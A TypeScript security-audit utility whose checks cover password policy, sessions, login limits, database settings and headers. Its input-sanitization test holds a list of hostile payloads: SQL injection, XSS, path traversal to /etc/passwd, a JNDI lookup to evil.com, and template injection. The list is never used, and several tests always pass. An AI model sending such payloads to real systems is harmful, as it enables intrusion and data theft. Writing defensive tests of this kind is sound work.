/**
 * Security testing and validation utilities
 */

export interface SecurityVulnerability {
  type: 'authentication' | 'authorization' | 'data' | 'network' | 'configuration';
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  recommendation: string;
  cwe?: string; // Common Weakness Enumeration ID
  affected_component?: string;
}

export interface SecurityTestResult {
  testName: string;
  passed: boolean;
  vulnerabilities: SecurityVulnerability[];
  recommendations: string[];
  riskScore: number; // 0-100
}

export interface SecurityAuditReport {
  timestamp: Date;
  overallRiskScore: number;
  testResults: SecurityTestResult[];
  summary: {
    totalTests: number;
    passedTests: number;
    failedTests: number;
    criticalVulnerabilities: number;
    highVulnerabilities: number;
    mediumVulnerabilities: number;
    lowVulnerabilities: number;
  };
}

export class SecurityUtils {
  /**
   * Perform comprehensive security audit
   */
  static async performSecurityAudit(config: any): Promise<SecurityAuditReport> {
    const testResults: SecurityTestResult[] = [];

    // Run all security tests
    testResults.push(await this.testPasswordPolicy(config.security));
    testResults.push(await this.testSessionManagement(config.security));
    testResults.push(await this.testAuthenticationSecurity(config.security));
    testResults.push(await this.testDataValidation());
    testResults.push(await this.testNetworkSecurity());
    testResults.push(await this.testDatabaseSecurity(config.database));
    testResults.push(await this.testInputSanitization());
    testResults.push(await this.testAccessControl());

    // Calculate overall risk score
    const overallRiskScore = this.calculateOverallRiskScore(testResults);

    // Generate summary
    const summary = this.generateSummary(testResults);

    return {
      timestamp: new Date(),
      overallRiskScore,
      testResults,
      summary
    };
  }

  /**
   * Test password policy security
   */
  static async testPasswordPolicy(securityConfig: any): Promise<SecurityTestResult> {
    const vulnerabilities: SecurityVulnerability[] = [];
    const recommendations: string[] = [];

    // Check minimum password length
    if (securityConfig.passwordMinLength < 8) {
      vulnerabilities.push({
        type: 'authentication',
        severity: 'medium',
        description: `Password minimum length is ${securityConfig.passwordMinLength}, below recommended 8 characters`,
        recommendation: 'Increase minimum password length to at least 8 characters',
        cwe: 'CWE-521',
        affected_component: 'AuthenticationService'
      });
    }

    // Check if password complexity is enforced (this would need actual implementation)
    recommendations.push('Implement password complexity requirements (uppercase, lowercase, numbers, special characters)');
    recommendations.push('Implement password history to prevent reuse of recent passwords');
    recommendations.push('Consider implementing password strength meter for user guidance');

    const riskScore = this.calculateRiskScore(vulnerabilities);

    return {
      testName: 'Password Policy Security',
      passed: vulnerabilities.length === 0,
      vulnerabilities,
      recommendations,
      riskScore
    };
  }

  /**
   * Test session management security
   */
  static async testSessionManagement(securityConfig: any): Promise<SecurityTestResult> {
    const vulnerabilities: SecurityVulnerability[] = [];
    const recommendations: string[] = [];

    // Check session timeout
    if (securityConfig.sessionTimeoutMinutes > 60) {
      vulnerabilities.push({
        type: 'authentication',
        severity: 'medium',
        description: `Session timeout is ${securityConfig.sessionTimeoutMinutes} minutes, exceeding recommended 60 minutes`,
        recommendation: 'Reduce session timeout to 60 minutes or less for better security',
        cwe: 'CWE-613',
        affected_component: 'AuthenticationService'
      });
    }

    // Check if secure session tokens are used
    recommendations.push('Implement secure session token generation using cryptographically strong random values');
    recommendations.push('Ensure session tokens are transmitted over HTTPS only');
    recommendations.push('Implement session token rotation on privilege escalation');

    const riskScore = this.calculateRiskScore(vulnerabilities);

    return {
      testName: 'Session Management Security',
      passed: vulnerabilities.length === 0,
      vulnerabilities,
      recommendations,
      riskScore
    };
  }

  /**
   * Test authentication security
   */
  static async testAuthenticationSecurity(securityConfig: any): Promise<SecurityTestResult> {
    const vulnerabilities: SecurityVulnerability[] = [];
    const recommendations: string[] = [];

    // Check login attempt limits
    if (securityConfig.maxLoginAttempts > 5) {
      vulnerabilities.push({
        type: 'authentication',
        severity: 'medium',
        description: `Maximum login attempts is ${securityConfig.maxLoginAttempts}, exceeding recommended 5 attempts`,
        recommendation: 'Reduce maximum login attempts to 5 or fewer to prevent brute force attacks',
        cwe: 'CWE-307',
        affected_component: 'AuthenticationService'
      });
    }

    // Check if account lockout is implemented
    recommendations.push('Implement progressive delays between failed login attempts');
    recommendations.push('Consider implementing CAPTCHA after multiple failed attempts');
    recommendations.push('Log and monitor failed authentication attempts');

    const riskScore = this.calculateRiskScore(vulnerabilities);

    return {
      testName: 'Authentication Security',
      passed: vulnerabilities.length === 0,
      vulnerabilities,
      recommendations,
      riskScore
    };
  }

  /**
   * Test data validation security
   */
  static async testDataValidation(): Promise<SecurityTestResult> {
    const vulnerabilities: SecurityVulnerability[] = [];
    const recommendations: string[] = [];

    // These would be actual tests against the validation utilities
    recommendations.push('Implement server-side validation for all user inputs');
    recommendations.push('Use parameterized queries to prevent SQL injection');
    recommendations.push('Validate and sanitize all data before database operations');
    recommendations.push('Implement input length limits to prevent buffer overflow attacks');

    const riskScore = this.calculateRiskScore(vulnerabilities);

    return {
      testName: 'Data Validation Security',
      passed: vulnerabilities.length === 0,
      vulnerabilities,
      recommendations,
      riskScore
    };
  }

  /**
   * Test network security
   */
  static async testNetworkSecurity(): Promise<SecurityTestResult> {
    const vulnerabilities: SecurityVulnerability[] = [];
    const recommendations: string[] = [];

    // Check for HTTPS enforcement
    recommendations.push('Ensure all API communications use HTTPS/TLS 1.2 or higher');
    recommendations.push('Implement certificate pinning for enhanced security');
    recommendations.push('Use secure headers (HSTS, CSP, X-Frame-Options)');
    recommendations.push('Implement request rate limiting to prevent DoS attacks');

    const riskScore = this.calculateRiskScore(vulnerabilities);

    return {
      testName: 'Network Security',
      passed: vulnerabilities.length === 0,
      vulnerabilities,
      recommendations,
      riskScore
    };
  }

  /**
   * Test database security
   */
  static async testDatabaseSecurity(databaseConfig: any): Promise<SecurityTestResult> {
    const vulnerabilities: SecurityVulnerability[] = [];
    const recommendations: string[] = [];

    // Check WAL mode for data integrity
    if (!databaseConfig.enableWAL) {
      vulnerabilities.push({
        type: 'data',
        severity: 'low',
        description: 'Database WAL mode is disabled, which may affect data integrity under concurrent access',
        recommendation: 'Enable WAL mode for better data integrity and performance',
        cwe: 'CWE-662',
        affected_component: 'DatabaseService'
      });
    }

    recommendations.push('Implement database encryption at rest');
    recommendations.push('Use prepared statements for all database queries');
    recommendations.push('Implement database access logging and monitoring');
    recommendations.push('Regular database backups with encryption');

    const riskScore = this.calculateRiskScore(vulnerabilities);

    return {
      testName: 'Database Security',
      passed: vulnerabilities.length === 0,
      vulnerabilities,
      recommendations,
      riskScore
    };
  }

  /**
   * Test input sanitization
   */
  static async testInputSanitization(): Promise<SecurityTestResult> {
    const vulnerabilities: SecurityVulnerability[] = [];
    const recommendations: string[] = [];

    // Test common injection patterns
    const injectionPatterns = [
      "'; DROP TABLE users; --",
      "<script>alert('xss')</script>",
      "../../etc/passwd",
      "${jndi:ldap://evil.com/a}",
      "{{7*7}}"
    ];

    // This would test actual validation functions
    recommendations.push('Implement comprehensive input sanitization for all user inputs');
    recommendations.push('Use whitelist validation instead of blacklist filtering');
    recommendations.push('Encode output data to prevent XSS attacks');
    recommendations.push('Validate file uploads and restrict file types');

    const riskScore = this.calculateRiskScore(vulnerabilities);

    return {
      testName: 'Input Sanitization Security',
      passed: vulnerabilities.length === 0,
      vulnerabilities,
      recommendations,
      riskScore
    };
  }

  /**
   * Test access control security
   */
  static async testAccessControl(): Promise<SecurityTestResult> {
    const vulnerabilities: SecurityVulnerability[] = [];
    const recommendations: string[] = [];

    // Test role-based access control
    recommendations.push('Implement principle of least privilege for all user roles');
    recommendations.push('Regularly audit user permissions and access rights');
    recommendations.push('Implement proper authorization checks for all sensitive operations');
    recommendations.push('Log all access control decisions for audit purposes');

    const riskScore = this.calculateRiskScore(vulnerabilities);

    return {
      testName: 'Access Control Security',
      passed: vulnerabilities.length === 0,
      vulnerabilities,
      recommendations,
      riskScore
    };
  }

  /**
   * Calculate risk score based on vulnerabilities
   */
  private static calculateRiskScore(vulnerabilities: SecurityVulnerability[]): number {
    let score = 0;
    
    vulnerabilities.forEach(vuln => {
      switch (vuln.severity) {
        case 'critical':
          score += 25;
          break;
        case 'high':
          score += 15;
          break;
        case 'medium':
          score += 10;
          break;
        case 'low':
          score += 5;
          break;
      }
    });

    return Math.min(score, 100); // Cap at 100
  }

  /**
   * Calculate overall risk score from all test results
   */
  private static calculateOverallRiskScore(testResults: SecurityTestResult[]): number {
    if (testResults.length === 0) return 0;
    
    const totalScore = testResults.reduce((sum, result) => sum + result.riskScore, 0);
    return Math.round(totalScore / testResults.length);
  }

  /**
   * Generate audit summary
   */
  private static generateSummary(testResults: SecurityTestResult[]): SecurityAuditReport['summary'] {
    const summary = {
      totalTests: testResults.length,
      passedTests: testResults.filter(r => r.passed).length,
      failedTests: testResults.filter(r => !r.passed).length,
      criticalVulnerabilities: 0,
      highVulnerabilities: 0,
      mediumVulnerabilities: 0,
      lowVulnerabilities: 0
    };

    testResults.forEach(result => {
      result.vulnerabilities.forEach(vuln => {
        switch (vuln.severity) {
          case 'critical':
            summary.criticalVulnerabilities++;
            break;
          case 'high':
            summary.highVulnerabilities++;
            break;
          case 'medium':
            summary.mediumVulnerabilities++;
            break;
          case 'low':
            summary.lowVulnerabilities++;
            break;
        }
      });
    });

    return summary;
  }

  /**
   * Test for common security headers
   */
  static testSecurityHeaders(headers: Record<string, string>): SecurityTestResult {
    const vulnerabilities: SecurityVulnerability[] = [];
    const recommendations: string[] = [];

    const requiredHeaders = {
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'X-XSS-Protection': '1; mode=block',
      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains'
    };

    Object.entries(requiredHeaders).forEach(([header, expectedValue]) => {
      if (!headers[header]) {
        vulnerabilities.push({
          type: 'network',
          severity: 'medium',
          description: `Missing security header: ${header}`,
          recommendation: `Add ${header}: ${expectedValue} header`,
          cwe: 'CWE-693',
          affected_component: 'NetworkLayer'
        });
      }
    });

    const riskScore = this.calculateRiskScore(vulnerabilities);

    return {
      testName: 'Security Headers Test',
      passed: vulnerabilities.length === 0,
      vulnerabilities,
      recommendations,
      riskScore
    };
  }

  /**
   * Generate security report in readable format
   */
  static generateSecurityReport(audit: SecurityAuditReport): string {
    let report = `Security Audit Report\n`;
    report += `Generated: ${audit.timestamp.toISOString()}\n`;
    report += `Overall Risk Score: ${audit.overallRiskScore}/100\n\n`;

    report += `Summary:\n`;
    report += `- Total Tests: ${audit.summary.totalTests}\n`;
    report += `- Passed: ${audit.summary.passedTests}\n`;
    report += `- Failed: ${audit.summary.failedTests}\n`;
    report += `- Critical Vulnerabilities: ${audit.summary.criticalVulnerabilities}\n`;
    report += `- High Vulnerabilities: ${audit.summary.highVulnerabilities}\n`;
    report += `- Medium Vulnerabilities: ${audit.summary.mediumVulnerabilities}\n`;
    report += `- Low Vulnerabilities: ${audit.summary.lowVulnerabilities}\n\n`;

    audit.testResults.forEach(result => {
      report += `${result.testName}: ${result.passed ? 'PASS' : 'FAIL'} (Risk: ${result.riskScore})\n`;
      
      if (result.vulnerabilities.length > 0) {
        report += `  Vulnerabilities:\n`;
        result.vulnerabilities.forEach(vuln => {
          report += `    - [${vuln.severity.toUpperCase()}] ${vuln.description}\n`;
          report += `      Recommendation: ${vuln.recommendation}\n`;
        });
      }
      
      if (result.recommendations.length > 0) {
        report += `  Recommendations:\n`;
        result.recommendations.forEach(rec => {
          report += `    - ${rec}\n`;
        });
      }
      
      report += `\n`;
    });

    return report;
  }
}